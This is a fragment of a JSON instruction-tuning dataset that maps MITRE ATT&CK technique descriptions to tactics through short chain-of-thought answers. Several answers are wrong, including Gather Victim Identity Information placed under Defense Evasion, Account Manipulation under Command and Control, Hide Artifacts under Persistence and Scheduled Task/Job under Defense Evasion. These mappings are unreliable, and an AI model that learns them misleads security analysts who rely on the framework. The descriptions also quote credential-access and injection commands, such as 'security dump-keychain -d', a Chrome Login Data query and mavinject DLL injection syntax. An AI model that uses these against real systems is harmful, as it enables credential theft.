      "question": "Which tactic is related to the following description:\nAn adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "answer": "The given description is related to sub technique: Malicious File (T1204.002);\nSub technique Malicious File (T1204.002) is a type of technique User Execution (T1204);\nTechnique User Execution (T1204) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.?",
    "context": "",
    "output": "The given description is related to sub technique Hidden Files and Directories (T1564.001);\nSub technique Hidden Files and Directories (T1564.001) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
      "answer": "The given description is related to sub technique Hidden Files and Directories (T1564.001);\nSub technique Hidden Files and Directories (T1564.001) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).?",
    "context": "",
    "output": "The given description is related to sub technique Credentials from Web Browsers (T1555.003);\nSub technique Credentials from Web Browsers (T1555.003) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "answer": "The given description is related to sub technique Credentials from Web Browsers (T1555.003);\nSub technique Credentials from Web Browsers (T1555.003) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may compromise access to third-party web services\u00a0that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",
    "context": "",
    "output": "The given description is related to sub technique: Web Services (T1584.006);\nSub technique Web Services (T1584.006) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may compromise access to third-party web services\u00a0that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",
      "answer": "The given description is related to sub technique: Web Services (T1584.006);\nSub technique Web Services (T1584.006) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API . Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.?",
    "context": "",
    "output": "The given description is related to sub technique: Exfiltration to Code Repository (T1567.001);\nSub technique Exfiltration to Code Repository (T1567.001) is a type of technique Exfiltration Over Web Service (T1567);\nTechnique Exfiltration Over Web Service (T1567) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API . Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
      "answer": "The given description is related to sub technique: Exfiltration to Code Repository (T1567.001);\nSub technique Exfiltration to Code Repository (T1567.001) is a type of technique Exfiltration Over Web Service (T1567);\nTechnique Exfiltration Over Web Service (T1567) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",
    "context": "",
    "output": "The given description is related to sub technique: Employee Names (T1589.003);\nSub technique Employee Names (T1589.003) is a type of technique Gather Victim Identity Information (T1589);\nTechnique Gather Victim Identity Information (T1589) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",
      "answer": "The given description is related to sub technique: Employee Names (T1589.003);\nSub technique Employee Names (T1589.003) is a type of technique Gather Victim Identity Information (T1589);\nTechnique Gather Victim Identity Information (T1589) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.",
    "context": "",
    "output": "The given description is related to sub technique Additional Cloud Roles (T1098.003);\nSub technique Additional Cloud Roles (T1098.003) is a type of technique Account Manipulation (T1098);\nTechnique Account Manipulation (T1098) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.",
      "answer": "The given description is related to sub technique Additional Cloud Roles (T1098.003);\nSub technique Additional Cloud Roles (T1098.003) is a type of technique Account Manipulation (T1098);\nTechnique Account Manipulation (T1098) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.?",
    "context": "",
    "output": "The given description is related to sub technique Mavinject (T1218.013);\nSub technique Mavinject (T1218.013) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.",
      "answer": "The given description is related to sub technique Mavinject (T1218.013);\nSub technique Mavinject (T1218.013) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.?",
    "context": "",
    "output": "The given description is related to sub technique: Keychain (T1555.001);\nSub technique Keychain (T1555.001) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.",
      "answer": "The given description is related to sub technique: Keychain (T1555.001);\nSub technique Keychain (T1555.001) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The given description is related to sub technique Mail Protocols (T1071.003);\nSub technique Mail Protocols (T1071.003) is a type of technique Application Layer Protocol (T1071);\nTechnique Application Layer Protocol (T1071) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The given description is related to sub technique Mail Protocols (T1071.003);\nSub technique Mail Protocols (T1071.003) is a type of technique Application Layer Protocol (T1071);\nTechnique Application Layer Protocol (T1071) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use Security Software Discovery and other Discovery/Reconnaissance activities to both discover and verify existing exclusions in a victim environment.?",
    "context": "",
    "output": "The given description is related to sub technique: File/Path Exclusions (T1564.012);\nSub technique File/Path Exclusions (T1564.012) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use Security Software Discovery and other Discovery/Reconnaissance activities to both discover and verify existing exclusions in a victim environment.",
      "answer": "The given description is related to sub technique: File/Path Exclusions (T1564.012);\nSub technique File/Path Exclusions (T1564.012) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.?",
    "context": "",
    "output": "The given description is related to sub technique Scheduled Task (T1053.005);\nSub technique Scheduled Task (T1053.005) is a type of technique Scheduled Task/Job (T1053);\nTechnique Scheduled Task/Job (T1053) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
      "answer": "The given description is related to sub technique Scheduled Task (T1053.005);\nSub technique Scheduled Task (T1053.005) is a type of technique Scheduled Task/Job (T1053);\nTechnique Scheduled Task/Job (T1053) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via Upload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: Match Legitimate Name or Location).",
    "context": "",
    "output": "The given description is related to sub technique Malicious Image (T1204.003);\nSub technique Malicious Image (T1204.003) is a type of technique User Execution (T1204);\nTechnique User Execution (T1204) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via Upload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: Match Legitimate Name or Location).",
      "answer": "The given description is related to sub technique Malicious Image (T1204.003);\nSub technique Malicious Image (T1204.003) is a type of technique User Execution (T1204);\nTechnique User Execution (T1204) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",
    "context": "",
    "output": "The given description is related to sub technique: Serverless (T1583.007);\nSub technique Serverless (T1583.007) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
